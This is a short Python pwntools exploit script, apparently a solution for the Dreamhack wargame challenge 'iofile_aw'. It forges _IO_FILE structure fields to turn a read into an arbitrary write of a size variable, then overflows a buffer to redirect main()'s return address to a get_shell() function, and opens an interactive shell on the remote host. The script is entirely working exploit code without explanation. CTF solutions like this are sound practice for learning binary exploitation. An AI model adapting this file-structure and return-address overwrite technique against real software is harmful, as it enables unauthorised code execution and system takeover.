from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/iofile_aw')
else:
    r = remote('host1.dreamhack.games', 16842)

sl = r.sendline
sa = r.sendafter

get_shell = 0x4009fa  # get_shell()
buf = 0x602040  # global var <buf>
size = 0x602010  # global var <size>


# overwrite size with 0x1000

payload = p64(0xfbad208b)  # flag
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(0)  # _IO_write_base
payload += p64(0)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(size)  # _IO_buf_base

r.sendafter('# ', b'printf ' + payload)

r.sendafter('# ', 'read\x00')
r.sendline(p64(0x1000))


# overwrite return address of main() with get_shell()

r.sendafter('# ', b'exit\x00'.ljust(0x228, b'a') + p64(get_shell))


r.interactive()